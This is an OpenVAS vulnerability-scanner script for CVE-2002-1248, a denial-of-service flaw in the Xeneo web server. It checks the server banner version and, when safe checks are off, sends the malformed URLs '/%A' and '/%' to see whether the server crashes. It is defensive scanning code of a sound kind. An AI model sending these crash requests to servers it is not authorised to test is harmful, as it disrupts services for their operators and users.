# OpenVAS Vulnerability Test
# $Id: xeneo_percent_DoS.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: Xeneo web server %A DoS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "It was possible to crash the remote 
Xeneo web server by requesting a malformed URL ending 
with /%A or /%";

tag_solution = "upgrade your web server or use another";

# See also: Xeneo_Web_Server_2.2.9.0_DoS.nasl by Bekrar Chaouki
# I wrote this script at the same time. Although both flaws target the same
# web server, I think that we should keep them separated, because it might
# affect other servers.
#
# References:
# From: "Carsten H. Eiram" <che@secunia.com>
# Subject: Secunia Research: Xeneo Web Server URL Encoding Denial of Service
# To: VulnWatch <vulnwatch@vulnwatch.org>, 
#  Full Disclosure <full-disclosure@lists.netsys.com>, 
#  Bugtraq <bugtraq@securityfocus.com>
# Date: 23 Apr 2003 09:49:56 +0200
#
# From: "David Endler" <dendler@idefense.com>
# To: vulnwatch@vulnwatch.org
# Date: Mon, 4 Nov 2002 00:46:47 -0500
# Subject: iDEFENSE Security Advisory 11.04.02b: Denial of Service Vulnerability in Xeneo Web Server

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.11546");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(6098);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_cve_id("CVE-2002-1248");
 
 name = "Xeneo web server %A DoS";
 script_name(name);
 

 
 script_category(ACT_MIXED_ATTACK);
  script_tag(name:"qod_type", value:"remote_banner");
  
 script_copyright("This script is Copyright (C) 2003 Michel Arboi");
 family = "Denial of Service";
 script_family(family);
 script_dependencies("gb_get_http_banner.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("Xeneo/banner");

 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);

b = get_http_banner(port: port);
if ( "Xeneo/" >!< b ) exit(0);

if(safe_checks())
{
  # I got one banner: "Server: Xeneo/2.2"
  if (b =~ 'Server: *Xeneo/2\\.(([0-1][ \t\r\n.])|(2(\\.[0-9])?[ \t\r\n]))')
  {
    report = "
You are running an old version of Xeneo web server. 
It may be crashed by requesting an URL ending with /%A or /%

** Note that OpenVAS did not perform a real test and 
** just checked the version number in the banner

Solution: upgrade to Xeneo 2.2.10";
    security_message(port: port, data: report);
  }
    
  exit(0);
}

if(http_is_dead(port:port))exit(0);
  
soc = http_open_socket(port);
if(! soc) exit(0);

items = make_list("/%A", "/%");

foreach i (items)
{
  data = http_get(item: i, port:port);
send(socket:soc, data:data);
r = http_recv(socket:soc);
http_close_socket(soc);
  if (http_is_dead(port:port))
  {
    security_message(port);
    exit(0);
  }
  soc = http_open_socket(port);  # The server is supposed to be alive...
  if (!soc) exit(0);	# Network glitch? 
}
